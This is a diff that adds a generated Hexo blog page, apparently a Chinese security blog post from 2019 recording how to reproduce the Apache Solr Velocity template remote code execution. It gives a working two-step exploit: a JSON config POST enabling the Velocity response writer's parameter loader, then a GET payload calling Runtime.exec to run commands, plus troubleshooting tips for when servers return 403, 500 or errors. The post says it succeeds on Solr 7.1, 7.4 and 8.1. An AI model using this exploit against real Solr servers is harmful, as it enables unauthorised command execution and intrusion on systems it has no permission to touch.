@@ -1,31 +1,159 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Apache solr RCE（CVE-2019-xxxx） | geez博客</title><meta name="keywords" content="web"><meta name="author" content="geez"><meta name="copyright" content="geez"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta property="og:url" content="https://geeeez.github.io/2019/10/31/Apache-solr%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="geez博客">
+<meta property="og:description" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://geeeez.github.io/null">
+<meta property="article:published_time" content="2019-10-31T15:12:57.000Z">
+<meta property="article:modified_time" content="2019-12-02T15:08:24.000Z">
+<meta property="article:author" content="geez">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://geeeez.github.io/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://geeeez.github.io/2019/10/31/Apache-solr%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.1.1',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
-block content
-  article#post(class="")
-    if top_img === false
-      include includes/header/post-info.pug
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-    #article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2019-12-02 23:08:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="geez博客" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">25</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">5</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%8E%86%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">复现历程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.</span> <span class="toc-text">注意事项</span></a></li></ol></div></div></div><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">geez博客</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Apache solr RCE（CVE-2019-xxxx）</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-31T15:12:57.000Z" title="发表于 2019-10-31 23:12:57">2019-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2019-12-02T15:08:24.000Z" title="更新于 2019-12-02 23:08:24">2019-12-02</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>&#160; &#160; &#160; 记录一下复现过程，防止下次遇见的时候再去翻资料， 首先 Apache Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 Apache solr历史上有众多高危漏洞，为了自己以后遇见直接找到所有漏洞复现方式，先贴个链接： <a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt ">apache solr历史漏洞列表</a></p>
+<a id="more"></a>
+
+<h3 id="复现历程"><a href="#复现历程" class="headerlink" title="复现历程"></a>复现历程</h3><p>1、点击core admin 查看部署的应用的路径 （下图应用名就是dovecot）<br><img src="/images/1572506935286.png" alt="1572506935286"></p>
+<p>2、POST 下面更改config的xml 到 /solr/应用名/config（比如：/solr/dovecot/config）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>3、请求 POC(注意编码问题，和空格问题)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;master_babyartikel_Product_flop&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(&#39;id&#39;))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1572507215924.png" alt="1572507215924"></p>
+<p>目前测试了 7.1 7.4 8.1 都可成功执行代码。</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>注意：</strong>1、如果第二步修改config响应403则没权限修，此时如果知道账号密码可进一步操作，如果不知道，建议放弃-哈哈。<br>&#160; &#160; &#160; &#160; &#160; 2、如果响应500可能存在的情况就是你的包出现了问题，再次检查请求包是否正确，如果正确则可能是solr的服务损坏。<br>&#160; &#160; &#160; &#160; &#160; 3、如果返回200也别太高兴，看看响应有没有error。没有error即可进行第三步，即命令执行POC。<br>&#160; &#160; &#160; &#160; &#160; 4、第二步成功的情况下，第三步绝大多数都可以成功，但是有的可能会返回xml，400，等一系列不正常的信息，这时候去看一下config - <a target="_blank" rel="noopener" href="http://x.x.x.x:8080/solr/%E5%BA%94%E7%94%A8%E5%90%8D/config">http://x.x.x.x:8080/solr/应用名/config</a> 查看配置是否真的被你在第二步更改了（搜索velocity 看前后是否是你POST修改的josn）。如果没有则重做第二步。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">geez</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://geeeez.github.io/2019/10/31/Apache-solr%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://geeeez.github.io/2019/10/31/Apache-solr%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://geeeez.github.io" target="_blank">geez博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/12/25/%E6%88%91%E7%9A%84git%E7%AC%94%E8%AE%B0/"><img class="prev-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">我的git笔记</div></div></a></div><div class="next-post pull-right"><a href="/2019/10/28/%E5%89%96%E6%9E%90%E8%87%AA%E5%B7%B1/"><img class="next-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">死亡剖析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/02/11/SSRF的那些事/" title="SSRF的那些问题"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-11</div><div class="title">SSRF的那些问题</div></div></a></div><div><a href="/2018/04/08/linux命令执行专题/" title="命令执行专题"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-04-08</div><div class="title">命令执行专题</div></div></a></div><div><a href="/2019/09/24/phpstudy漏洞/" title="phpstudy后门事件"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-24</div><div class="title">phpstudy后门事件</div></div></a></div><div><a href="/2018/09/27/一篇文件搞懂sqlmap的tamper/" title="一篇文章搞懂sqlmap的tamper"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-09-27</div><div class="title">一篇文章搞懂sqlmap的tamper</div></div></a></div><div><a href="/2019/06/01/关于反弹shell的那些事/" title="关于反弹shell的那些事"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-06-01</div><div class="title">关于反弹shell的那些事</div></div></a></div><div><a href="/2020/05/31/绕过CDN查真实ip/" title="绕过CDN查找真实ip"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-31</div><div class="title">绕过CDN查找真实ip</div></div></a></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By geez</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
